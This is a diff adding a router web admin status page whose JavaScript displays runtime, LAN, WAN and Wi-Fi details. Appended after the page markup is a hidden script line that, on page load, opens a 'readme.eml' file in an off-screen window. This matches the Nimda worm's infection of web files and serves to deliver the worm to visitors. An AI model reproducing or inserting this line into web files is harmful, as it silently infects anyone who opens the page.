@@ -1,0 +1,307 @@
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<script type="text/javascript">
+    $(document).ready(function() {
+        var currentId = Page.currentId;
+        var count = 0;
+        var loading = '-';
+
+        function loop() {
+            loadPage();
+            loadWlanPage();
+        }
+
+
+        function getRegState(flag) {
+            var csRegState ="-", psRegState ="-";
+            switch(flag) {
+                case 0:
+                    csRegState = DOC.registerStatus.item0;
+                    psRegState = DOC.registerStatus.item0;
+                    break;
+                case 1:
+                    csRegState = DOC.registerStatus.item7;
+                    psRegState = DOC.registerStatus.item0;
+                    break;
+                case 2:
+                    csRegState = DOC.registerStatus.item7;
+                    psRegState = DOC.registerStatus.item0;
+                    break;
+                case 3:
+                    csRegState = DOC.registerStatus.item7;
+                    psRegState = DOC.registerStatus.item7;
+                    break;
+                default:
+                    csRegState = DOC.registerStatus.item8;
+                    psRegState = DOC.registerStatus.item8;
+                    break;
+            }
+            return { csRegState: csRegState, psRegState: psRegState };
+        }
+
+        function loadPage() {
+
+            Page.postJSON({
+                json: { cmd: RequestCmd.SYS_INFO },
+                success: function(datas) {
+                    var data2 = datas.data;
+                    console.log(data2);
+					
+                    var data_system = data2.system;
+                    var data_lan = data2.lan;
+                    var data_modem = data2.modem;
+                    var data_wan = data2.network;
+
+                    Page.isNULLToSpace = true;
+
+                    var names_run = [],names_sim = [], names_net = [], names_lan = [], names_wan = [],names_lte = [];
+                    var values_run = [], values_sim = [], values_net = [], values_lan = [], values_wan = [], values_lte = [];
+                    names_run.push(DOC.lbl.runtime);
+                    names_run.push(DOC.lbl.loadAvg);
+//                    names_run.push(run_text.currentSys);
+                    names_run.push(DOC.lbl.memory);
+
+                    var runtime = ConvertUtil.timeStamp(data_system.runtime || 0);
+                    values_run.push(runtime);
+                    values_run.push((data_system.cpu_average1 || loading) + ", " + (data_system.cpu_average5 || loading) + ", " + (data_system.cpu_average15 || loading));
+                    values_run.push("MemTotal "+ (data_system.mem_total ? FormatUtil.formatField(data_system.mem_total, 'KB') : loading) +
+                                    "MemFree " + (data_system.mem_free ? FormatUtil.formatField(data_system.mem_free, 'KB') : loading) +
+                                    "Cached  " + (data_system.mem_cache ? FormatUtil.formatField(data_system.mem_cache, 'KB') : loading));
+
+
+
+                    var stateInfo = "";
+
+
+                    names_lan.push(DOC.net.mac);
+                    names_lan.push(DOC.net.ip);
+                    names_lan.push(DOC.net.mask);
+
+                    values_lan.push(data_lan.lan_mac || loading);
+
+                    Page.lanIp = data_lan.server_ip;
+                    values_lan.push(data_lan.server_ip || loading);
+                    values_lan.push(data_lan.netmask || loading);
+
+                    names_lan.push(DOC.net.dhcpServer);
+                    var dhcp = data_lan.enable ? '1' : '0';
+                    if(dhcp == DHCPServer.CLOSED){
+                        values_lan.push(DOC.status.closed);
+                    } else {
+                        values_lan.push(DOC.status.opened);
+                    }
+
+                    names_wan.push(DOC.net.mac);
+                    names_wan.push(DOC.net.ip);
+                    names_wan.push(DOC.net.mask);
+                    names_wan.push(DOC.net.gateway);
+                    names_wan.push(DOC.net.dns1);
+                    names_wan.push(DOC.net.dns2);
+
+
+                    values_wan.push(data_wan.mac || loading);
+                    values_wan.push(data_wan.ipaddr || loading);
+                    values_wan.push(data_wan.netmask || loading);
+                    values_wan.push(data_wan.gateway || loading);
+                    if(data_wan.ipaddr == undefined){
+                            values_wan.push("-");
+                            values_wan.push("-");
+                    } else {
+                            values_wan.push(data_wan.first_dns || loading);
+                            values_wan.push(data_wan.second_dns || loading);
+                    }
+                    
+                    names_wan.push(DOC.net.rxPackets);
+                    names_wan.push(DOC.net.rxBytes);
+                    names_wan.push(DOC.net.txPackets);
+                    names_wan.push(DOC.net.txBytes);
+                    // names_wan.push(wan_text.manageTime);
+
+                    values_wan.push(data_wan.rx_packets || loading);
+                    values_wan.push(data_wan.rx_bytes || loading);
+                    values_wan.push(data_wan.tx_packets || loading);
+                    values_wan.push(data_wan.tx_bytes || loading);
+                    // var manageTime = parseInt(data.manageTime.trim());
+                    // var theUptime = parseInt(data.theUptime.trim());
+                    // if (!isNaN(manageTime) && !isNaN(theUptime)) {
+                    // 	var millseconds = new Date().getTime() - (theUptime - manageTime) * 1000;
+                    // 	var manageDate = new Date(millseconds);
+                    // 	values_wan.push(manageDate.format("yyyy-mm-dd HH:MM:ss"));
+                    // } else {
+                    // 	values_wan.push(data.manageTime);
+                    // }
+                    //  var  warningsss = getWanState(data.showMode);
+
+                    //if (warningsss != ""){
+                    //  var stateWan = String.format('<span style="color:black;"> &nbsp;{0}</span>', warningsss);
+					
+                    var run_html = Page.createTable(DOC.title.run, names_run, values_run, names_run.length, 2).replace("<td>", "<td style=\"width:32%;\">");
+                    var wan_html = Page.createTable(DOC.title.wan, names_wan, values_wan, names_wan.length, 2).replace("<td>", "<td style=\"width:32%;\">");
+                    var lan_html = Page.createTable(DOC.title.lan, names_lan, values_lan, names_lan.length, 2).replace("<td>", "<td style=\"width:32%;\">");
+
+
+                    $('#run_info').html(run_html);
+                    $('#wan_info').html(wan_html);
+                    $('#lan_info').html(lan_html);
+
+                   // Page.setStripeTable();
+                    Page.isNULLToSpace = false;
+                }
+            });
+
+
+        }
+
+        function getWlanSecMode(encry)
+        {
+            var secMode = "None";
+
+            switch (encry){
+                case "none" :
+                    secMode = "None";
+                    break;
+                case "wep" :
+                    secMode = "wep";
+                    break;
+                case "psk" :
+                    secMode = "wpa-psk";
+                    break;
+                case "psk2" :
+                    secMode = "wpa2-psk";
+                    break;
+                case "mixed" :
+                    secMode = "wpa/wpa2-psk";
+                    break;
+            }
+
+            return secMode;
+        }
+
+        function getWlanMode(mode) {
+            var secMode;
+            switch (mode){
+                case 0 :
+                    secMode = "legacy 11b/g mixed";
+                    break;
+                case 1 :
+                    secMode = "legacy 11b only";
+                    break;
+                case 2 :
+                    secMode = "legacy 11a only";
+                    break;
+                case 3 :
+                    secMode = "legacy 11a/b/g mixed";
+                    break;
+                case 4 :
+                    secMode = "legacy 11g only";
+                    break;
+                case 5 :
+                    secMode = "11abgn mixed";
+                    break;
+                case 6 :
+                    secMode = "11N";
+                    break;
+                case 7 :
+                    secMode = "11gn mixed";
+                    break;
+                case 8 :
+                    secMode = "11an mixed";
+                    break;
+                case 9 :
+                    secMode = "11bgn mixed";
+                    break;
+                case 10 :
+                    secMode = "11AGN mixed";
+                    break;
+                case 11 :
+                    secMode = "11N ";
+                    break;
+                case 14 :
+                    secMode = "11A/AN/AC";
+                    break;
+                case 15 :
+                    secMode = "11 AN/AC";
+                    break;
+                default :
+                    secMode = "ap";
+                    break;
+            }
+
+            return secMode;
+        }
+
+        function loadWlanPage() {
+            Page.postJSON({
+                json: {cmd: RequestCmd.WIFI_INFO},
+                success: function (datas) {
+                    var data = {"mode":"Master","message":"WLAN未开启"};
+                    var wirelessHtml = "";
+                    if (data.mode.trim() == "NULL") {
+                        wirelessHtml = Page.createTable(DOC.title.wlan2g + '-' + data.message, [], [], 0, 0);
+                    } else {
+                        var names = [];
+                        var values = [];
+                        var data2 = datas.data;
+                        names.push(DOC.wlan.currentMode);
+                        var mode = getWlanMode(parseInt(data2.mode));
+                        values.push(mode);
+
+                        names.push(DOC.wlan.wifi);
+                        if(data2.status == "0"){
+                            values.push(DOC.status.opened);
+                        } else {
+                            values.push(DOC.status.closed);
+                        }
+
+                        names.push(DOC.wlan.ssid);
+                        values.push(data2.ssid || loading);
+
+                        names.push(DOC.net.mac);
+                        values.push(data2.mac || loading);
+
+                        names.push(DOC.wlan.ssidBroadcast);
+                        if(data2.hidden_ssid == "0"){
+                            values.push(DOC.status.opened);
+                        } else {
+                            values.push(DOC.status.closed);
+                        }
+
+                       names.push(DOC.wlan.secMode);
+                        if(data2.encryption){
+                            var encryp = data2.encryption.split("+")[0];
+                            values.push(getWlanSecMode(encryp));
+                        }else{
+                            values.push(loading);
+                        }
+
+                        //values.push(FormatUtil.formatField(getWlanSecMode(data.encKey.trim(), data.wpa.trim(), data.wpaKeyMgmt.trim(), data.wpaPairwise.trim())));
+
+                        names.push(DOC.wlan.channel);
+                        values.push(data2.channel || loading);
+
+                        names.push(DOC.wlan.txPower);
+                        values.push(data2.txpower ? FormatUtil.formatField(data2.txpower, "dBm") : loading);
+
+
+                        wirelessHtml = Page.createTable(DOC.title.wlan2g, names, values, names.length, 2).replace("<td>", "<td style=\"width:32%;\">");
+                    }
+                    $('#wlan_info').html(wirelessHtml);
+                    Page.setStripeTable("#wlan_info");
+                }
+            });
+
+        }
+
+
+        loop();
+
+    });
+</script>
+
+<div class="detail_box">
+    <div id="run_info"></div>
+    <div id="wan_info"></div>
+    <div id="lan_info"></div>
+    <div id="wlan_info"></div>
+</div>
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html> 
